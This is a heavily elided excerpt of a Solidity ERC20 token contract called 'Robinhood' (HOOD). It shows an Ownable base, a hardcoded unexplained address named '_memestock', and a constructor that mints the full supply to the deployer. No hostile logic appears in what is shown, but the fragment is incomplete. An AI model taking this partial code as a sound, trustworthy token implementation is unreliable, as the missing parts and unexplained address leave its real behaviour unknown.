...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _memestock = 0x63adBBCB9Bb798d3f4bE8C8535AD311049636011;
    address public pair;
    ...
    function _DeployRobinhood(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRobinhood(creator, initialSupply);
    }
}

contract Robinhood is ERC20Token {
    constructor() ERC20Token("Robinhood", "HOOD", msg.sender, 101747000 * 10 ** 18) {
    }
}